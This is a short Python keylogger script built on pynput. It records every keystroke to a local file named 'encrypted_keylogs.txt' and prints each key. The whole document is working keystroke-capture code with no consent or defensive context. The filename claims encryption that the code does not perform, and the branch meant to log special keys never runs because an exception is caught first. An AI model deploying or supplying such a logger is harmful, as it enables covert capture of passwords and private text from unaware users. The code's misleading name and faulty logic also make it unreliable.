from pynput import keyboard

def on_press(key):
    try:
        with open('encrypted_keylogs.txt', 'a') as f:
            if key.char:
                f.write(key.char)
            else:
                f.write(str(key))
        print(key)
    except Exception as e:
        print(e)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()